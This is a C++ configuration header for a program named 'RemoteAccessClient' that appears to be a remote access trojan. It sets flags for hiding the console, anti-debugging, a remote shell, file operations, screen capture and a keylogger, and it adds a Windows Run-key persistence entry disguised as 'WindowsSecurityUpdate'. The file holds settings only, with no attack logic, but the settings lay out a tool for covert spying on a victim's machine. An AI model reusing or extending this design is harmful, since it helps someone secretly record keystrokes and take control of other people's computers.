#pragma once

#include <string>
#include <cstdint>

namespace Config {
    // Server connection settings
    constexpr const char* SERVER_HOST = "127.0.0.1";  // Default to localhost
    constexpr uint16_t SERVER_PORT = 8080;
    
    // Connection settings
    constexpr int CONNECT_TIMEOUT = 10;      // seconds
    constexpr int RECONNECT_DELAY = 30;      // seconds
    constexpr int HEARTBEAT_INTERVAL = 30;   // seconds
    constexpr int MAX_RECONNECT_ATTEMPTS = -1; // -1 for infinite
    
    // Buffer sizes
    constexpr size_t BUFFER_SIZE = 4096;
    constexpr size_t MAX_MESSAGE_SIZE = 1024 * 1024; // 1MB
    
    // Client identification
    constexpr const char* CLIENT_VERSION = "1.0.0";
    constexpr const char* CLIENT_NAME = "RemoteAccessClient";
    
    // Stealth settings
    constexpr bool HIDE_CONSOLE = true;
    constexpr bool ENABLE_PERSISTENCE = true;
    constexpr bool ENABLE_ANTI_DEBUG = true;
    
    // Logging settings
    constexpr bool ENABLE_LOGGING = true;
    constexpr bool LOG_TO_FILE = true;
    constexpr bool LOG_TO_CONSOLE = false;
    constexpr const char* LOG_DIRECTORY = "logs";
    
    // Security settings
    constexpr bool ENABLE_ENCRYPTION = true;
    constexpr const char* ENCRYPTION_KEY = "DefaultKey123456"; // Should be changed
    
    // Feature flags
    constexpr bool ENABLE_SHELL = true;
    constexpr bool ENABLE_FILE_OPERATIONS = true;
    constexpr bool ENABLE_SCREEN_CAPTURE = true;
    constexpr bool ENABLE_KEYLOGGER = true;
    constexpr bool ENABLE_SYSTEM_INFO = true;
    
    // Performance settings
    constexpr int THREAD_POOL_SIZE = 4;
    constexpr int MESSAGE_QUEUE_SIZE = 100;
    
    // Registry persistence settings (Windows)
#ifdef _WIN32
    constexpr const char* REGISTRY_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    constexpr const char* REGISTRY_VALUE_NAME = "WindowsSecurityUpdate";
#endif
    
    // File paths
    constexpr const char* CONFIG_FILE = "config.ini";
    constexpr const char* TEMP_DIRECTORY = "temp";
    
    // Network protocol settings
    constexpr const char* PROTOCOL_VERSION = "1.0";
    constexpr const char* MESSAGE_DELIMITER = "\n";
    
    // Command execution settings
    constexpr int COMMAND_TIMEOUT = 60;      // seconds
    constexpr size_t MAX_COMMAND_OUTPUT = 1024 * 512; // 512KB
    
    // Screen capture settings
    constexpr int SCREEN_CAPTURE_QUALITY = 75; // JPEG quality 0-100
    constexpr int SCREEN_CAPTURE_FPS = 10;
    constexpr bool SCREEN_CAPTURE_CURSOR = true;
    
    // Keylogger settings
    constexpr int KEYLOG_BUFFER_SIZE = 1024;
    constexpr int KEYLOG_FLUSH_INTERVAL = 10; // seconds
    
    // File transfer settings
    constexpr size_t FILE_CHUNK_SIZE = 8192;  // 8KB chunks
    constexpr int FILE_TRANSFER_TIMEOUT = 300; // 5 minutes
    
    // Error handling
    constexpr int MAX_ERROR_COUNT = 10;
    constexpr int ERROR_RESET_INTERVAL = 300; // 5 minutes
}